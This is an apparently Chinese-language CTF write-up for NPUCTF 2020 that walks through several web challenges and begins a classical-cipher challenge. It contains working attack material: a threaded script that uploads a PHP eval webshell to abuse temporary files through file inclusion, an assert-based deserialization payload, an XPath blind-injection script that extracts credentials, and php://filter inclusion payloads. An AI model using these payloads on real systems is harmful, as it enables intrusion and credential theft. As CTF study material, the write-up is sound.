---
title: NPUCTF
date: 2020-04-19 20:52:53
updated: 2020-04-19 20:52:53
tags:
 - NPUCTF
 - xpath注入
 - 利用文件包含+php临时缓存拿shell
categories:
 - 刷题记录
---

# web

## 验证🐎

给了源码

<!--more-->

```js
const express = require('express');
const bodyParser = require('body-parser');
const cookieSession = require('cookie-session');

const fs = require('fs');
const crypto = require('crypto');

const keys = require('./key.js').keys;

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

function saferEval(str) {
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
    return null;
  }
  return eval(str);
} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个

const template = fs.readFileSync('./index.html').toString();
function render(results) {
  return template.replace('{{results}}', results.join('<br/>'));
}

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(cookieSession({
  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧
  keys
}));

Object.freeze(Object);
Object.freeze(Math);

app.post('/', function (req, res) {
  let result = '';
  const results = req.session.results || [];
  const { e, first, second } = req.body;
  if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {
    if (req.body.e) {
      try {
        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
      } catch (e) {
        console.log(e);
        result = 'Wrong Wrong Wrong!!!';
      }
      results.unshift(`${req.body.e}=${result}`);
    }
  } else {
    results.unshift('Not verified!');
  }
  if (results.length > 13) {
    results.pop();
  }
  req.session.results = results;
  res.send(render(req.session.results));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get('/source', function (req, res) {
  res.set('Content-Type', 'text/javascript;charset=utf-8');
  res.send(fs.readFileSync('./index.js'));
});

app.get('/', function (req, res) {
  res.set('Content-Type', 'text/html;charset=utf-8');
  req.session.admin = req.session.admin || 0;
  res.send(render(req.session.results = req.session.results || []))
});

app.listen(80, '0.0.0.0', () => {
  console.log('Start listening')
});
```





## web🐕

给了源码

```php
 <?php 
error_reporting(0);
include('config.php');   # $key,$flag
define("METHOD", "aes-128-cbc");  //定义加密方式
define("SECRET_KEY", $key);    //定义密钥
define("IV","6666666666666666");    //定义初始向量 16个6
define("BR",'<br>');
if(!isset($_GET['source']))header('location:./index.php?source=1');


#var_dump($GLOBALS);   //听说你想看这个？
function aes_encrypt($iv,$data)
{
    echo "--------encrypt---------".BR;
    echo 'IV:'.$iv.BR;
    return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;
}
function aes_decrypt($iv,$data)
{
    return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die('False');
}
if($_GET['method']=='encrypt')
{
    $iv = IV;
    $data = $flag;    
    echo aes_encrypt($iv,$data);
} else if($_GET['method']=="decrypt")
{
    $iv = @$_POST['iv'];
    $data = @$_POST['data'];
    echo aes_decrypt($iv,$data);
}
echo "我摊牌了，就是懒得写前端".BR;

if($_GET['source']==1)highlight_file(__FILE__);
?> 
```









## 超简单的PHP！！！超简单！！！

查看源码发现index.bak.php

点进去之后url是`http://ha1cyon-ctf.fun:30094/index.bak.php?action=message.php`

尝试使用伪协议读取源码

```php
//index.bak.php
<?php 
session_start();
if(isset($_GET['action'])){
    include $_GET['action'];
    exit();
} else {
    header("location:./index.bak.php?action=message.php");
}
```

```php+HTML
//message.php
<html>
<head>
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link href="static/bootstrap.min.css" rel="stylesheet" type="text/css">

		<title>X佬留言板</title>
	</head>
	<body>
		<div class="container">
			<h1>👴过留声 燕过留名</h1>
<!--			假的navbar-->
			<navbar>
				<ul class="nav nav-tabs">
				  <li class="nav-item">
					<a class="nav-link " href="./index.php">Index</a>
				  </li>
				  <li class="nav-item">
					<a class="nav-link table-active " href="./message.php">Message</a>
				  </li>
				  <li class="nav-item">
					<a class="nav-link" href="./phpinfo.php">tips</a>
				  </li>
				</ul>
			</navbar>
<!--			假的navbar-->
			<div>
				<form id="message-form">
					<textarea  id="msg" cols="45" rows="3" placeholder="🌶你进群，还不快来👴直接把⚰都给bypass给你看信不信">
```

```php
//msg.php
<?php 
header('content-type:application/json');
session_start();
function safe($msg){
    if (strlen($msg)>17){
        return "msg is too loooong!";
    } else {
        return preg_replace("/php/","?",$msg);
    }
}

if (!isset($_SESSION['msg'])&empty($_SESSION['msg']))$_SESSION['msg'] = array();

if (isset($_POST['msg']))
{
    
    array_push($_SESSION['msg'], ['msg'=>safe($_POST['msg']),'time'=>date('Y-m-d H:i:s',time())]);
    echo json_encode(array(['msg'=>safe($_POST['msg']),'time'=>date('Y-m-d H:i:s',time())]));
    exit();
}
if(!empty($_SESSION['msg'])){
        echo json_encode($_SESSION['msg']);
} else {echo "还不快去留言！";}
?>
```





## RealEzPHP

查看源码发现

```html
<p>百万前端的NPU报时中心为您报时：<a href="./time.php?source"></a></p>
```

点击之后得time.php到源码

```php
 <?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);

```

编写脚本经过测试，部分函数被禁用。

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "phpinfo()";
        $this->b = "assert";
    }
    }

$c = new HelloPhp;


echo serialize($c); //O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}
```

查看phpinfo被禁用如下函数

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir
```

后面查找发现flag在phpinfo中



## 查源码

url前面加上 view-source:



## ezinclude

查看源码得到

```html
username/password error<html>
<!--md5($secret.$name)===$pass -->
</html>
```

抓包发现cookie里面有一个hash，直接提交即可。

目录扫描发现了一个dir.php。

提交之后来到了/flflflflag.php，然后立马跳转到404.html。

```html
<html>
<head>
<script language="javascript" type="text/javascript">
           window.location.href="404.html";
</script>
<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
</head>
<>
<body>
include($_GET["file"])</body>
</html>
```

利用文件包含查看源码

```php+HTML
///flflflflag.php
html>
<head>
<script language="javascript" type="text/javascript">
           window.location.href="404.html";
</script>
<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
</head>
<>
<body>
<?php
$file=$_GET['file'];
if(preg_match('/data|input|zip/is',$file)){
	die('nonono');
}
@include($file);
echo 'include($_GET["file"])';
?>
</body>
</html>
```

经过一番查找后，考点是这个[PHP临时文件机制与利用的思考](https://www.anquanke.com/post/id/183046)

利用[Mote](https://www.anquanke.com/member/144041)师傅github中的脚本[poc1](https://github.com/Mote-Z/PHP-Is-The-Best/blob/master/PHP_Tempfile_Exploit/POC1/upload.py),

```python
import requests
import time
import threading

s = requests.session()
url = 'http://fa1203f5-0c7d-4e2f-8674-c614670aa93f.node3.buuoj.cn/flflflflag.php?file=flflflflag.php'
files = {'file' + str(i): ('webshell', '@<?php @eval($_GET[1]);?>' + 'test' + str(i), 'text/php') for i in range(20)}
header = {
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Connection': 'close'
}


def upload_file():
    try:
        while 1:
            r = s.post(url=url, headers=header, files=files)
    except requests.exceptions.ConnectionError:
        print('Connection Error')
        time.sleep(5)


def main():
    workers = []
    for t in range(50):
        worker = threading.Thread(target=upload_file, args=())
        worker.start()
        workers.append(worker)
    for worker in workers:
        worker.join()


if __name__ == '__main__':
    main()
```

一直跑，然后在dir.php查看目录文件，再包含shell进去。

![](/pic/166.png)

```
payload:/flflflflag.php?file=/tmp/phpylUNtT&1=phpinfo();
```

发现flag在phpinfo中。

![](/pic/166.png)

## ezlogin

打开题目，是一个登陆框，随意发送数据后抓包发现传入的数据是xml格式的，猜测是xpath注入。

![](/pic/164.png)

于是尝试xpath注入万能密码,失败。尝试盲注。发现只能提交一次数据就要刷新。

当语句执行正确时（`' or count(/)=1 or '1`），提示非法操作

![](/pic/165.png)

当语句错误时（`' or count(/)=2 or '1`）,提示账号或密码错误。

编写盲注脚本

```python
import requests
import re
import string

se = requests.session()


def get(payload):
    pattern = 'id="token" value="(.*?)" />'
    url = 'http://94b8372f-c5d8-4348-afa2-522c9b88f1d8.node3.buuoj.cn/login.php'
    headers = {'Content-Type': 'application/xml'}
    username = payload
    password = '123'
    data = "<username>" + username + "</username><password>" + password + "</password><token>" + \
           re.findall(pattern, se.get(url).text)[0] + "</token>"
    # print(data)
    html = se.post(url, headers=headers, data=data)
    # print(html.text)
    return html


def search(s_payload, len=999):
    result = ''
    x = 1
    error = 0
    while x <= len:
        dic = string.printable
        for s in dic:
            if 'text()' in s_payload:
                payload = "' or substring(%s,%d,1)='%s' or '1" % (s_payload, x, s)
            else:
                payload = "' or substring(name(%s),%d,1)='%s' or '1" % (s_payload, x, s)
            # payload = "' or substring(name(%s), %d, 1)='%s' or '1" % (s_payload, x, s)
            res = get(payload)
            if res.status_code == 404 or res.status_code == 429:
                x = x - 1
                error = 1
                break
            html = res.text
            if '非法操作' in html:
                break
        if error == 0:
            result += s
            print(result)
        x = x + 1
    return result


def get_root():
    s_payload = "/*[1]"
    root = search(s_payload)
    print(root)


def self_define(strs):
    s_payload = '%s' % strs
    tables = search(s_payload)


if __name__ == '__main__':
    # get_root()  #root

    # self_define("/root/*[1]")  #accounts

    # self_define("/root/accounts/*[1]") # user

    # self_define("/root/accounts/*[1]/*[1]")  #id
    # self_define("/root/accounts/*[1]/*[2]")  #usernmae
    # self_define("/root/accounts/*[1]/*[3]")  #password

    # self_define("/root/*[1]/*[1]/*[2]/text()") #guest
    # self_define("/root/*[1]/*[1]/*[3]/text()")  #e10adc3949ba59abbe56e057f20f883e

    # self_define("/root/*[1]/*[2]/*[2]/text()")  #adm1n
    self_define("/root/*[1]/*[2]/*[3]/text()")  #cf7414b5bdb2e65ee43083f4ddbc4d9f
```

将密码解码得到 guest/123456. Adm1n/gtfly123

发现链接是

```
?file=welcome
```

常见的文件包含形式,读取welcom源码，发现过滤了php,base，大写绕过即可

```
payload：?file=Php://filter/convert.Base64-encode/resource=welcome
```

得到提示，flag is  in /flag

读取flag

```
payload：?file=Php://filter/convert.Base64-encode/resource=/flag
```



# crypto

## Classical Cipher

打开文件，key.txt内容为

```
解密后的flag请用flag{}包裹

压缩包密码：gsv_pvb_rh_zgyzhs

对应明文：   ***_key_**_******
```

目测凯撒，或者维吉尼亚密码，丢进quipquip，得到密码

```
the_key_is_atbash
```

之后是一张图片

j  pplj j  k







